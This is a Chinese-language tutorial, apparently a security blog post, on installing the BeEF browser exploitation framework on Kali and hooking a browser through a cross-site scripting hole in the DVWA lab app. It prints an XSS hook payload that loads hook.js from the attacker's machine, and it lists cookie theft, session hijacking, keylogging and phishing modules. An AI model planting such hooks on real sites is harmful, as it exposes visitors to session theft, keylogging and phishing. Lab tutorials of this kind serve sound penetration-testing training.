***本工具仅供技术分享、交流讨论，严禁用于非法用途。**

## 简介

Browser Exploitation Framework(BeEF) BeEF是日前最强大的浏览器开源渗透测试框架,通过X55漏洞配合JS脚本和
Metasploit进行渗透; BeEF是基于Ruby语言编写的,并且支持图形化界面,操作简单 <http://beefproject.com>

主要功能

#### 信息收集:

> 1.网络发现  
> 2.主机信息  
> 3.Cookie获取  
> 4.会话劫持  
> 5.键盘记录  
> 6.插件信息

持久化控制:

> 1.确认弹框  
> 2.小窗口  
> 3.中间人

社会工程:

> 1.点击劫持  
> 2.弹窗告警  
> 3.虚假页面  
> 4.钓鱼页面

渗透攻击:

> 1.内网渗透  
> 2.Metasploit  
> 3.CSRF攻击  
> 4.DDOS攻击

我这里用kali 启动Apache：`service apache2 start`

然后安装Beef工具

我用脚本安装

    
    
    命令：  
    apt-get update  
    apt-get install beef-xss  
    apt-get install beef-xss  
    beef-xss

启动之后

![1621257990_60a26f06dc50f9d11de7a.png!small?1621257991992](https://image.3001.net/images/20210517/1621257990_60a26f06dc50f9d11de7a.png!small?1621257991992)

    
    
    Hook: <script src="http://<IP>:3000/hook.js"></script>

会弹出来beef的登录窗口

这边我们在看一下beef绑定的3000端口

![1621258371_60a270832792d58a44311.png!small?1621258372104](https://image.3001.net/images/20210517/1621258371_60a270832792d58a44311.png!small?1621258372104)

发现绑定3000端口的IP是0.0.0.0

发现是0.0.0.0 监听3000端口

那么远程也是可以访问的

    
    
    http://192.168.29.131:3000/ui/authentication

![1621258049_60a26f41623c115b06d1a.png!small?1621258050359](https://image.3001.net/images/20210517/1621258049_60a26f41623c115b06d1a.png!small?1621258050359)

查看账号密码（也可进行更改）

找到配置文件（kali默认在/etc/beef-xss/config.yaml中）；

    
    
    cat /etc/beef-xss/config.yaml

![1621258104_60a26f781db006942fc54.png!small?1621258105043](https://image.3001.net/images/20210517/1621258104_60a26f781db006942fc54.png!small?1621258105043)

BeEF-XSS主页面介绍

启动BeFF-XSS并登陆进去

方式一：在命令行中打beef-xss

![1621258116_60a26f847a69640c39f5c.png!small?1621258117622](https://image.3001.net/images/20210517/1621258116_60a26f847a69640c39f5c.png!small?1621258117622)

方式二：

![1621258228_60a26ff456fd81e7ac2d3.png!small?1621258229523](https://image.3001.net/images/20210517/1621258228_60a26ff456fd81e7ac2d3.png!small?1621258229523)启动后的界面

![1621258241_60a2700122478dbb15323.png!small?1621258242157](https://image.3001.net/images/20210517/1621258241_60a2700122478dbb15323.png!small?1621258242157)

 **Hocked Browers：**

online browers 在线浏览器 offline browers 离线浏览器

 **Detials：** 浏览器、插件版本信息，操作系统信息

 **Logs：** 浏览器动作：焦点变化，鼠标单击，信息输入

*commands：

绿色模块：表示模块适用当前用户，并且执行结果对用户不可见 红色模块：表示模块不适用当前用户，有些红色模块也可以执行 橙色模块：模块可用，但结果对用户可见
灰色模块：模块为在目标浏览器上测试过

payload

这里需要把图中红框中的payload复制粘贴到你的目标xss的位置，然后将其中的`<IP>`改成你这台kali的IP地址，最终payload为：

    
    
    '<script src="http://X.X.X.X:3000/hook.js"></script>'

![1621258258_60a27012077388e0c52c6.png!small?1621258259259](https://image.3001.net/images/20210517/1621258258_60a27012077388e0c52c6.png!small?1621258259259)

使用方法

这里我们使用DVWA做实验：

![1621258277_60a2702557f243fbe20bb.png!small?1621258278327](https://image.3001.net/images/20210517/1621258277_60a2702557f243fbe20bb.png!small?1621258278327)

这时候再回到BeEF中查看，会发现online browers中多了点东西

![1621258285_60a2702dabbaa5c76c3b5.png!small?1621258286805](https://image.3001.net/images/20210517/1621258285_60a2702dabbaa5c76c3b5.png!small?1621258286805)

打开"current Browsers" 下的"commands",就可以运行模块对目标系统进行入侵。

![1621258294_60a27036189a1a82bd933.png!small?1621258295202](https://image.3001.net/images/20210517/1621258294_60a27036189a1a82bd933.png!small?1621258295202)

例子：选择"Brower"下面的"Hooked Domain"的create Alert Dialog（弹窗 ），点击右下角的"execute"运行

![1621258310_60a270469c9023498f300.png!small?1621258312457](https://image.3001.net/images/20210517/1621258310_60a270469c9023498f300.png!small?1621258312457)

这样我们就能在DVWA上看到弹窗了。

![1621258316_60a2704c99a792c51709e.png!small?1621258317631](https://image.3001.net/images/20210517/1621258316_60a2704c99a792c51709e.png!small?1621258317631)

也可以执行其他操作

